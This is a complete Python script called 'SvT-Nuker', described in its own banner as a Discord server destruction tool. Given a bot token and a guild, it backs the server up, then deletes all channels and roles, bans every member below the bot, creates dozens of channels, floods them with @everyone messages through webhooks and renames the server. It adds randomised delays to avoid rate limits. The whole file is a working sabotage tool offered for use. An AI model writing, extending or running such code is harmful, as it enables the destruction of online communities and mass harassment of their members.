#!/usr/bin/env python3
"""
code.py - Interactive Discord server nuker for the terminal.

        SvT-Nuker - purple/blue themed console UI

Flow:
  1) Asks for the bot token (visible input, validated against Discord first)
  2) Asks for the guild ID (or a name substring, or 'list')
  3) Shows a numbered action menu

Run:      python code.py
Requires: Python 3.10+ and discord.py>=2.3.2
"""

from __future__ import annotations

import asyncio
import contextlib
import datetime as dt
import json
import logging
import os
import random
import signal
from pathlib import Path

import aiohttp
import discord

# --------------------------------------------------------------------------- #
# Theme / ANSI helpers
# --------------------------------------------------------------------------- #
RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"

PURPLE = (168, 85, 247)     # #A855F7
BLUE = (56, 189, 248)       # #38BDF8
VIOLET = (139, 92, 246)
CYAN = (34, 211, 238)

COLOR = True


def enable_ansi() -> None:
    """Turn on VT100 sequences on Windows consoles."""
    if os.name == "nt":
        with contextlib.suppress(OSError):
            os.system("")
    global COLOR
    COLOR = not os.getenv("NO_COLOR")


def rgb(t: tuple[int, int, int]) -> str:
    return f"\033[38;2;{t[0]};{t[1]};{t[2]}m"


def mix(a: tuple[int, int, int], b: tuple[int, int, int], t: float) -> tuple[int, int, int]:
    t = min(1.0, max(0.0, t))
    return (
        int(a[0] + (b[0] - a[0]) * t),
        int(a[1] + (b[1] - a[1]) * t),
        int(a[2] + (b[2] - a[2]) * t),
    )


def gradient(text: str, start=PURPLE, end=BLUE) -> str:
    if not COLOR:
        return text
    total = max(len(text) - 1, 1)
    return "".join(rgb(mix(start, end, i / total)) + ch for i, ch in enumerate(text)) + RESET


def purple(text: str) -> str:
    return f"{rgb(PURPLE)}{text}{RESET}" if COLOR else text


def blue(text: str) -> str:
    return f"{rgb(BLUE)}{text}{RESET}" if COLOR else text


def dim(text: str) -> str:
    return f"{DIM}{text}{RESET}" if COLOR else text


LOGO = [
    "  ███████╗ ██╗   ██╗ ████████╗",
    "  ██╔════╝ ██║   ██║ ╚══██╔══╝",
    "  ███████╗ ██║   ██║    ██║   ",
    "  ╚════██║ ╚██╗ ██╔╝    ██║   ",
    "  ███████║  ╚████╔╝     ██║   ",
    "  ╚══════╝   ╚═══╝      ╚═╝   ",
    "           N U K E R          ",
]


def print_logo() -> None:
    total = sum(len(l) for l in LOGO) or 1
    idx = 0
    for row in LOGO:
        out = []
        for ch in row:
            out.append(rgb(mix(PURPLE, BLUE, idx / total)) + ch)
            idx += 1
        print("".join(out) + RESET)
    print(dim("  ──────────────────────────────────────"))
    print(dim("   Discord server destruction tool") + purple("  ·  v2.0"))
    print()


# --------------------------------------------------------------------------- #
# Paths and defaults
# --------------------------------------------------------------------------- #
BASE_DIR = Path(__file__).resolve().parent
CONFIG_PATH = BASE_DIR / "config.json"
BACKUP_DIR = BASE_DIR / "backups"
LOG_DIR = BASE_DIR / "logs"
BACKUP_DIR.mkdir(exist_ok=True)
LOG_DIR.mkdir(exist_ok=True)

REASON = "SvT-Nuker"
API = "https://discord.com/api/v10"
DEFAULT_CFG = {"delay": 0.35, "concurrency": 4}

INTENTS = discord.Intents.default()
INTENTS.members = True
INTENTS.guilds = True

logging.basicConfig(
    level=logging.WARNING,
    format="%(levelname)s | %(message)s",
    handlers=[logging.FileHandler(LOG_DIR / "nuker.log", encoding="utf-8")],
)
log = logging.getLogger("svt_nuker")


# --------------------------------------------------------------------------- #
# Output / input helpers
# --------------------------------------------------------------------------- #
def stamp() -> str:
    return dt.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")


def line(n: int = 64, char: str = "-") -> None:
    print(gradient(char * n))


def ok(msg: str) -> None:
    print(f"  {blue('[+]')} {msg}")


def warn(msg: str) -> None:
    print(f"  {purple('[!]')} {msg}")


async def ainput(prompt: str = "") -> str:
    return await asyncio.to_thread(input, prompt)


async def ask(prompt: str, default: str | None = None) -> str:
    hint = dim(f" [{default}]") if default not in (None, "") else ""
    value = (await ainput(f"{purple(prompt)}{hint}: ")).strip()
    return value or (default or "")


async def ask_int(prompt: str, default: int, lo: int, hi: int) -> int:
    while True:
        raw = await ask(prompt, str(default))
        try:
            value = int(raw)
        except ValueError:
            warn("Enter a whole number")
            continue
        if lo <= value <= hi:
            return value
        warn(f"Value must be between {lo} and {hi}")


async def ask_yes(prompt: str, default: bool = False) -> bool:
    hint = "Y/n" if default else "y/N"
    raw = (await ainput(f"{purple(prompt)} {dim('[' + hint + ']')}: ")).strip().lower()
    if not raw:
        return default
    return raw in {"y", "yes", "1"}


# --------------------------------------------------------------------------- #
# Saved config
# --------------------------------------------------------------------------- #
def load_cfg() -> dict:
    if CONFIG_PATH.exists():
        try:
            return {**DEFAULT_CFG, **json.loads(CONFIG_PATH.read_text(encoding="utf-8"))}
        except (json.JSONDecodeError, OSError):
            warn("config.json is corrupt - ignoring it")
    return dict(DEFAULT_CFG)


def save_cfg(cfg: dict) -> None:
    keys = ("token", "guild_id", "delay", "concurrency")
    data = {k: cfg[k] for k in keys if k in cfg}
    CONFIG_PATH.write_text(json.dumps(data, indent=2), encoding="utf-8")
    with contextlib.suppress(OSError):
        os.chmod(CONFIG_PATH, 0o600)
    ok(f"Saved to {CONFIG_PATH.name}")


# --------------------------------------------------------------------------- #
# Token handling (visible input)
# --------------------------------------------------------------------------- #
async def get_token(cfg: dict) -> str:
    saved = str(cfg.get("token") or os.getenv("DISCORD_TOKEN") or "").strip()
    if saved and saved != "PUT_BOT_TOKEN_HERE":
        masked = saved[:8] + "..." + saved[-6:]
        if await ask_yes(f"A saved token was found ({masked}) - use it?", True):
            return saved

    print(dim("  Token will be visible as you type. (q + Enter to quit)"))
    while True:
        token = (await ainput(f"{purple('Paste the bot token')}: ")).strip()
        if token.lower() in {"q", "quit", "exit"}:
            raise SystemExit("\nExiting.")
        if token.count(".") == 2 and len(token) >= 50:
            return token
        warn("Invalid token format - it must contain two dots and be about 70 chars")


async def whoami(token: str) -> dict | None:
    try:
        async with aiohttp.ClientSession() as session:
            url = f"{API}/users/@me"
            headers = {"Authorization": f"Bot {token}"}
            async with session.get(url, headers=headers) as resp:
                if resp.status == 200:
                    return await resp.json()
                body = (await resp.text())[:140]
                warn(f"Discord rejected the token (HTTP {resp.status}): {body}")
                return None
    except aiohttp.ClientError as exc:
        warn(f"Could not reach Discord: {exc}")
        return None


# --------------------------------------------------------------------------- #
# Guild selection
# --------------------------------------------------------------------------- #
async def pick_guild(client: discord.Client, cfg: dict) -> discord.Guild:
    while True:
        default = str(cfg.get("guild_id") or "")
        raw = await ask("Guild ID, part of its name, or 'list' to show all", default)

        if raw.lower() in {"list", "l", "?"}:
            line()
            if not client.guilds:
                warn("The bot is not in any guild - invite it first")
            for g in sorted(client.guilds, key=lambda x: x.name.lower()):
                print(f"  {blue(str(g.id))}   |   {g.name}   |   members: {g.member_count}")
            line()
            continue

        if not raw:
            warn("Enter an ID or 'list'")
            continue

        guild = client.get_guild(int(raw)) if raw.isdigit() else None

        if guild is None:
            matches = [g for g in client.guilds if raw.lower() in g.name.lower()]
            if len(matches) == 1:
                guild = matches[0]
            elif matches:
                warn("Multiple matches - pick one by ID:")
                for g in matches:
                    print(f"    {g.id} | {g.name}")
                continue

        if guild is None:
            warn("Guild not found - make sure the bot is a member (try 'list')")
            continue

        cfg["guild_id"] = guild.id
        return guild


def show_perms(guild: discord.Guild) -> None:
    perms = guild.me.guild_permissions
    checks = {
        "manage_channels": "Manage Channels",
        "manage_roles": "Manage Roles",
        "ban_members": "Ban Members",
        "manage_webhooks": "Manage Webhooks",
        "manage_guild": "Manage Guild (rename)",
    }
    line()
    print(f"  {purple('Guild')}    : {BOLD}{guild.name}{RESET}  (ID: {guild.id})")
    print(f"  {purple('Channels')} : {len(guild.channels)}   Roles: {len(guild.roles)}   Members: {guild.member_count}")
    print(f"  {purple('Bot role')} : {guild.me.top_role.name}")
    for key, label in checks.items():
        mark = blue("[+]") if getattr(perms, key) else purple("[x]")
        print(f"   {mark} {label}")
    line()


# --------------------------------------------------------------------------- #
# Backup helpers
# --------------------------------------------------------------------------- #
def channel_kind(ch: discord.abc.GuildChannel) -> str:
    if isinstance(ch, discord.CategoryChannel):
        return "category"
    if isinstance(ch, discord.StageChannel):
        return "stage"
    if isinstance(ch, discord.VoiceChannel):
        return "voice"
    if isinstance(ch, discord.ForumChannel):
        return "forum"
    return "text"


def build_backup(guild: discord.Guild) -> dict:
    channels = []
    for ch in guild.channels:
        item = {
            "name": ch.name,
            "kind": channel_kind(ch),
            "category": ch.category.name if ch.category else None,
            "position": ch.position,
        }
        if isinstance(ch, (discord.TextChannel, discord.ForumChannel)):
            item["topic"] = getattr(ch, "topic", None)
            item["nsfw"] = getattr(ch, "nsfw", None)
            item["slowmode"] = getattr(ch, "slowmode_delay", 0)
        channels.append(item)

    roles = []
    for r in guild.roles:
        if r.is_default() or r.managed:
            continue
        roles.append(
            {
                "name": r.name,
                "permissions": r.permissions.value,
                "color": r.colour.value,
                "hoist": r.hoist,
                "mentionable": r.mentionable,
                "position": r.position,
            }
        )

    return {
        "created_at": dt.datetime.now().isoformat(timespec="seconds"),
        "guild": {
            "id": guild.id,
            "name": guild.name,
            "icon": str(guild.icon.url) if guild.icon else None,
        },
        "roles": roles,
        "channels": sorted(channels, key=lambda c: c["position"]),
        "emojis": [{"name": e.name, "url": str(e.url)} for e in guild.emojis],
    }


# --------------------------------------------------------------------------- #
# Actions
# --------------------------------------------------------------------------- #
class Actions:
    def __init__(self, cfg: dict, guild: discord.Guild):
        self.cfg = cfg
        self.guild = guild
        self.stop = asyncio.Event()

    @property
    def delay(self) -> float:
        return float(self.cfg.get("delay", 0.35))

    async def _run(self, factories: list, limit: int | None = None) -> int:
        sem = asyncio.Semaphore(limit or int(self.cfg.get("concurrency", 4)))
        errors = 0

        async def worker(factory):
            nonlocal errors
            async with sem:
                if self.stop.is_set():
                    return
                try:
                    await factory()
                except discord.HTTPException as exc:
                    errors += 1
                    print(f"    {purple('[!]')} {exc.status}: {(exc.text or '')[:70]}")
                finally:
                    await asyncio.sleep(self.delay * random.uniform(0.7, 1.3))

        await asyncio.gather(*(worker(f) for f in factories))
        return errors

    def sigint_on(self) -> None:
        with contextlib.suppress(NotImplementedError, RuntimeError, AttributeError):
            asyncio.get_running_loop().add_signal_handler(signal.SIGINT, self.stop.set)
        print(dim("  (press Ctrl+C to stop immediately)"))

    def sigint_off(self) -> None:
        with contextlib.suppress(NotImplementedError, RuntimeError, AttributeError):
            asyncio.get_running_loop().remove_signal_handler(signal.SIGINT)

    # ---------------------------------------------------------------- backup
    def backup(self) -> Path:
        data = build_backup(self.guild)
        path = BACKUP_DIR / f"{self.guild.id}_{stamp()}.json"
        path.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
        ok(f"Backup: {path.name} ({len(data['channels'])} channels, {len(data['roles'])} roles)")
        return path

    # -------------------------------------------------------------- deletion
    async def delete_channels(self, keep_id: int | None = None) -> int:
        normal = [
            c for c in self.guild.channels
            if not isinstance(c, discord.CategoryChannel) and c.id != keep_id
        ]
        cats = [
            c for c in self.guild.channels
            if isinstance(c, discord.CategoryChannel) and c.id != keep_id
        ]
        total = len(normal) + len(cats)
        if not total:
            warn("No channels to delete")
            return 0
        print(f"  Deleting {purple(str(total))} channels...")
        jobs = [lambda c=c: c.delete(reason=REASON) for c in normal + cats]
        errors = await self._run(jobs)
        deleted = total - errors
        ok(f"Deleted {deleted} channels")
        return deleted

    async def delete_roles(self) -> int:
        me_top = self.guild.me.top_role
        candidates = sorted(self.guild.roles, key=lambda x: x.position, reverse=True)
        targets = [
            r for r in candidates
            if not r.is_default() and not r.managed and r < me_top
        ]
        if not targets:
            warn("No deletable roles (is the bot role too low?)")
            return 0
        print(f"  Deleting {purple(str(len(targets)))} roles...")
        jobs = [lambda r=r: r.delete(reason=REASON) for r in targets]
        errors = await self._run(jobs)
        deleted = len(targets) - errors
        ok(f"Deleted {deleted} roles")
        return deleted

    async def ban_all(self) -> int:
        if not self.guild.me.guild_permissions.ban_members:
            warn("The bot lacks the ban_members permission")
            return 0
        me_top = self.guild.me.top_role
        banned = 0
        print("  Banning members...")
        try:
            async for member in self.guild.fetch_members(limit=None):
                if self.stop.is_set():
                    break
                if member.id in (self.guild.owner_id, self.guild.me.id):
                    continue
                if member.top_role >= me_top:
                    continue
                try:
                    await member.ban(reason=REASON, delete_message_seconds=0)
                    banned += 1
                except discord.HTTPException as exc:
                    print(f"    {purple('[!]')} {member}: {exc.status}")
                await asyncio.sleep(self.delay * random.uniform(0.7, 1.3))
        except discord.HTTPException as exc:
            warn(f"Failed to fetch members ({exc.status}) - enable SERVER MEMBERS INTENT")
        ok(f"Banned {banned} members")
        return banned

    # ----------------------------------------------------- create and spam
    async def create_channels(self, count: int, name: str) -> list[discord.TextChannel]:
        sem = asyncio.Semaphore(3)
        created: list[discord.TextChannel] = []

        async def make(index: int):
            async with sem:
                if self.stop.is_set():
                    return
                try:
                    channel = await self.guild.create_text_channel(f"{name}-{index:02d}", reason=REASON)
                    created.append(channel)
                except discord.HTTPException as exc:
                    print(f"    {purple('[!]')} create: {exc.status}")
                await asyncio.sleep(self.delay * random.uniform(0.7, 1.3))

        print(f"  Creating {purple(str(count))} channels named {name}-XX ...")
        await asyncio.gather(*(make(i) for i in range(count)))
        ok(f"Created {len(created)} channels")
        return created

    async def spam(self, channels: list[discord.TextChannel], message: str, per_channel: int) -> int:
        if not message or per_channel <= 0:
            return 0
        sent = 0

        async def worker(channel: discord.TextChannel):
            nonlocal sent
            hook = None
            if self.guild.me.guild_permissions.manage_webhooks:
                with contextlib.suppress(discord.HTTPException):
                    hook = await channel.create_webhook(name=REASON, reason=REASON)
            for _ in range(per_channel):
                if self.stop.is_set():
                    break
                try:
                    if hook is not None:
                        await hook.send(message, wait=False)
                    else:
                        await channel.send(message)
                    sent += 1
                except discord.HTTPException as exc:
                    print(f"    {purple('[!]')} send: {exc.status}")
                    break
                await asyncio.sleep(self.delay)

        print(f"  Sending {purple(str(per_channel))} messages per channel...")
        await asyncio.gather(*(worker(c) for c in channels))
        ok(f"Sent {sent} messages")
        return sent

    # ---------------------------------------------------------- full nuke
    async def full_nuke(self, name: str, channels: int, spam_count: int,
                        message: str, do_ban: bool, do_roles: bool) -> None:
        self.stop.clear()
        self.sigint_on()
        started = dt.datetime.now()
        stats = {}

        try:
            print(f"\n{gradient('[0/5] Backup before destruction')}")
            self.backup()

            print(f"\n{gradient('[1/5] Deleting channels')}")
            stats["channels_deleted"] = await self.delete_channels()

            if do_roles and not self.stop.is_set():
                print(f"\n{gradient('[2/5] Deleting roles')}")
                stats["roles_deleted"] = await self.delete_roles()

            if do_ban and not self.stop.is_set():
                print(f"\n{gradient('[3/5] Banning members')}")
                stats["banned"] = await self.ban_all()

            if not self.stop.is_set():
                print(f"\n{gradient('[4/5] Creating channels and spamming')}")
                created = await self.create_channels(channels, name)
                stats["channels_created"] = len(created)
                stats["messages"] = await self.spam(created, message, spam_count)

            if not self.stop.is_set() and self.guild.me.guild_permissions.manage_guild:
                print(f"\n{gradient('[5/5] Renaming the server')}")
                with contextlib.suppress(discord.HTTPException):
                    await self.guild.edit(name=name[:100], reason=REASON)
                    ok(f"Server name: {name}")
        finally:
            self.sigint_off()
            elapsed = round((dt.datetime.now() - started).total_seconds(), 1)
            report = {
                "guild": {"id": self.guild.id, "name": self.guild.name},
                "started": started.isoformat(timespec="seconds"),
                "duration_s": elapsed,
                "stopped": self.stop.is_set(),
                "stats": stats,
            }
            path = LOG_DIR / f"report_{self.guild.id}_{stamp()}.json"
            path.write_text(json.dumps(report, indent=2), encoding="utf-8")
            line()
            print(f"  {BOLD}Result:{RESET}" + ("  (stopped manually)" if self.stop.is_set() else ""))
            print(f"    Channels deleted : {stats.get('channels_deleted', 0)}")
            print(f"    Roles deleted    : {stats.get('roles_deleted', 0)}")
            print(f"    Members banned   : {stats.get('banned', 0)}")
            print(f"    Channels created : {stats.get('channels_created', 0)}")
            print(f"    Messages sent    : {stats.get('messages', 0)}")
            print(f"    Duration         : {elapsed}s")
            print(f"    Report           : {path.name}")
            line()

    # ------------------------------------------------------------ restore
    async def pick_backup(self) -> Path | None:
        files = sorted(BACKUP_DIR.glob("*.json"), reverse=True)
        if not files:
            warn("No backups found")
            return None
        shown = files[:15]
        for i, f in enumerate(shown, 1):
            print(f"   {purple(str(i))}) {f.name}")
        index = await ask_int("Pick a backup number", 1, 1, len(shown))
        return shown[index - 1]

    async def restore(self, path: Path) -> None:
        data = json.loads(path.read_text(encoding="utf-8"))
        self.stop.clear()
        self.sigint_on()
        try:
            print(f"  Restoring from {purple(path.name)} ...")
            for role in data.get("roles", []):
                if self.stop.is_set():
                    break
                with contextlib.suppress(discord.HTTPException):
                    await self.guild.create_role(
                        name=role["name"],
                        permissions=discord.Permissions(role.get("permissions", 0)),
                        colour=discord.Colour(role.get("color", 0)),
                        hoist=role.get("hoist", False),
                        mentionable=role.get("mentionable", False),
                        reason=REASON,
                    )
                await asyncio.sleep(self.delay)

            cats: dict[str, discord.CategoryChannel] = {}
            for ch in data.get("channels", []):
                if ch.get("kind") != "category" or self.stop.is_set():
                    continue
                with contextlib.suppress(discord.HTTPException):
                    cats[ch["name"]] = await self.guild.create_category(ch["name"], reason=REASON)
                await asyncio.sleep(self.delay)

            restored = 0
            for ch in data.get("channels", []):
                if ch.get("kind") == "category" or self.stop.is_set():
                    continue
                cat = cats.get(ch.get("category") or "")
                kind = ch.get("kind")
                try:
                    if kind == "voice":
                        await self.guild.create_voice_channel(ch["name"], category=cat, reason=REASON)
                    elif kind == "stage":
                        await self.guild.create_stage_channel(ch["name"], category=cat, reason=REASON)
                    elif kind == "forum":
                        topic = (ch.get("topic") or "")[:1024]
                        await self.guild.create_forum(ch["name"], category=cat, topic=topic, reason=REASON)
                    else:
                        await self.guild.create_text_channel(
                            ch["name"],
                            category=cat,
                            topic=ch.get("topic") or None,
                            nsfw=bool(ch.get("nsfw")),
                            slowmode_delay=int(ch.get("slowmode") or 0),
                            reason=REASON,
                        )
                    restored += 1
                except discord.HTTPException as exc:
                    print(f"    {purple('[!]')} {ch.get('name')}: {exc.status}")
                await asyncio.sleep(self.delay)

            roles_count = len(data.get("roles", []))
            ok(f"Restored {restored} channels and {roles_count} roles")
        finally:
            self.sigint_off()


# --------------------------------------------------------------------------- #
# Menu
# --------------------------------------------------------------------------- #
MENU_ITEMS = [
    ("1", "Backup (non-destructive)"),
    ("2", "Show plan only (dry-run)"),
    ("3", "Full nuke (delete everything + create + spam)"),
    ("4", "Delete all channels"),
    ("5", "Delete all roles"),
    ("6", "Ban all members"),
    ("7", "Create channels + spam"),
    ("8", "Rename the server"),
    ("9", "Restore from a backup"),
    ("10", "Change target guild"),
    ("11", "Change token (reconnect)"),
    ("12", "Exit"),
]


def render_menu() -> None:
    for num, label in MENU_ITEMS:
        print(f"  {BOLD}{purple(num.rjust(2))}{RESET}) {dim(label)}")


async def prompt_nuke_params() -> dict:
    name = (await ask("Name used for channels/roles/server", "SvT"))[:32]
    channels = await ask_int("Number of channels to create", 20, 0, 50)
    spam_count = await ask_int("Messages per channel (0 = no spam)", 5, 0, 20)
    message = await ask("Message text", "@everyone")
    do_ban = await ask_yes("Ban every member?", True)
    do_roles = await ask_yes("Delete every role?", True)
    return {
        "name": name,
        "channels": channels,
        "spam_count": spam_count,
        "message": message,
        "do_ban": do_ban,
        "do_roles": do_roles,
    }


async def menu(client: discord.Client, actions: Actions) -> str:
    guild = actions.guild
    line()
    print(f"  {gradient('SvT-NUKER')}  {dim('|')}  Bot: {client.user}")
    print(f"  {dim('Guild:')} {BOLD}{guild.name}{RESET} ({guild.id})")
    print(f"  {dim('Channels:')} {len(guild.channels)}   {dim('Roles:')} {len(guild.roles)}   {dim('Members:')} {guild.member_count}")
    line()
    render_menu()
    line()
    choice = await ask_int("Choose an action", 1, 1, 12)

    if choice == 1:
        actions.backup()

    elif choice == 2:
        p = await prompt_nuke_params()
        line()
        print(f"  {gradient('Plan for this guild:')}")
        print(f"    - Delete {len(guild.channels)} channels")
        print(f"    - Delete {'all' if p['do_roles'] else '0'} roles")
        print(f"    - Ban: {'all members' if p['do_ban'] else 'no'}")
        print(f"    - Create {p['channels']} channels + {p['spam_count']} messages each")
        print(f"    - Rename the server to {p['name']}")
        line()

    elif choice == 3:
        p = await prompt_nuke_params()
        if await ask_yes(f'Confirm FULL destruction of "{guild.name}"?', False):
            await actions.full_nuke(**p)
        else:
            warn("Cancelled")

    elif choice == 4:
        if await ask_yes("Delete all channels?", False):
            actions.stop.clear()
            await actions.delete_channels()

    elif choice == 5:
        if await ask_yes("Delete all deletable roles?", False):
            actions.stop.clear()
            await actions.delete_roles()

    elif choice == 6:
        if await ask_yes("Ban every member?", False):
            actions.stop.clear()
            await actions.ban_all()

    elif choice == 7:
        count = await ask_int("Number of channels", 20, 0, 50)
        per = await ask_int("Messages per channel", 5, 0, 20)
        message = await ask("Message text", "@everyone")
        name = (await ask("Channel name prefix", "SvT"))[:32]
        actions.stop.clear()
        created = await actions.create_channels(count, name)
        await actions.spam(created, message, per)

    elif choice == 8:
        new_name = await ask("New server name", guild.name)
        try:
            await guild.edit(name=new_name[:100], reason=REASON)
            ok(f"Server is now named: {new_name}")
        except discord.HTTPException as exc:
            warn(f"Rename failed: {exc.status} (manage_guild required)")

    elif choice == 9:
        path = await actions.pick_backup()
        if path is not None:
            if await ask_yes("Restore the structure on top of the current state?", False):
                await actions.restore(path)

    elif choice == 10:
        return "guild"

    elif choice == 11:
        return "token"

    else:
        return "exit"

    return "menu"


# --------------------------------------------------------------------------- #
# Main flow
# --------------------------------------------------------------------------- #
async def run() -> None:
    enable_ansi()
    print()
    print_logo()

    cfg = load_cfg()

    while True:
        token = await get_token(cfg)
        info = await whoami(token)
        if not info:
            continue
        cfg["token"] = token
        ok(f"Token valid - bot: {info['username']} (ID: {info['id']})")

        client = discord.Client(intents=INTENTS)
        try:
            await client.login(token)
        except discord.LoginFailure:
            warn("Login failed")
            continue

        ws = asyncio.create_task(client.connect())
        try:
            await client.wait_until_ready()
            ok(f"Connected - member of {len(client.guilds)} guild(s)")

            actions = Actions(cfg, await pick_guild(client, cfg))
            show_perms(actions.guild)

            step = "menu"
            while step == "menu":
                step = await menu(client, actions)
                if step == "guild":
                    actions.guild = await pick_guild(client, cfg)
                    show_perms(actions.guild)
                    step = "menu"

            if step == "exit":
                if await ask_yes("Save the token and guild ID for next time?", True):
                    save_cfg(cfg)
                return
        finally:
            await client.close()
            ws.cancel()
            with contextlib.suppress(BaseException):
                await ws


def main() -> None:
    try:
        asyncio.run(run())
    except KeyboardInterrupt:
        print("\nExiting.")
    except SystemExit as exc:
        if exc.code:
            print(exc.code)


if __name__ == "__main__":
    main()